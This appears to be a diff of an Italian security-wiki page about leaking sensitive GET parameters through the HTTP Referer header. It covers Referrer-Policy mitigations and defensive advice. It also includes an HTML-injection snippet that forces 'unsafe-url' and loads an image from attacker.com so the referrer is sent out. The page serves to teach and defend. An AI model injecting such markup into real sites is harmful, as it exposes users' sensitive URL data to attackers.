@@ -1,16 +1,18 @@
+# HTTP interessanti
+
 {{#include ../banners/hacktricks-training.md}}
 
-# Intestazioni e politiche del referrer
+## Header Referrer e policy
 
-Il referrer è l'intestazione utilizzata dai browser per indicare quale fosse la pagina precedente visitata.
+Referrer è l'header utilizzato dai browser per indicare quale sia stata la pagina visitata in precedenza.
 
-## Informazioni sensibili trapelate
+### Informazioni sensibili esposte
 
-Se in un certo momento all'interno di una pagina web si trovano informazioni sensibili nei parametri di una richiesta GET, se la pagina contiene link a fonti esterne o un attaccante è in grado di far visitare (ingegneria sociale) all'utente un URL controllato dall'attaccante. Potrebbe essere in grado di esfiltrare le informazioni sensibili all'interno dell'ultima richiesta GET.
+Se in un qualsiasi punto di una pagina web sono presenti informazioni sensibili nei parametri di una richiesta GET, se la pagina contiene link a fonti esterne oppure se un attacker è in grado di indurre/suggerire (tramite social engineering) all'utente di visitare un URL controllato dall'attacker, potrebbe essere possibile esfiltrare le informazioni sensibili contenute nell'ultima richiesta GET.
 
-## Mitigazione
+### Mitigazione
 
-Puoi far seguire al browser una **Referrer-policy** che potrebbe **evitare** che le informazioni sensibili vengano inviate ad altre applicazioni web:
+È possibile fare in modo che il browser segua una **Referrer-policy** che possa **evitare** l'invio delle informazioni sensibili ad altre web application:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,15 +23,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Contromisure
+### Contromisura
 
-Puoi sovrascrivere questa regola utilizzando un tag meta HTML (l'attaccante deve sfruttare un'iniezione HTML):
+È possibile ignorare questa regola utilizzando un meta tag HTML (l'attaccante deve sfruttare un'HTML injection):
 ```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Difesa
 
-Non inserire mai dati sensibili all'interno dei parametri GET o dei percorsi nell'URL.
+Non inserire mai dati sensibili nei parametri GET o nei percorsi dell'URL.
 
 {{#include ../banners/hacktricks-training.md}}
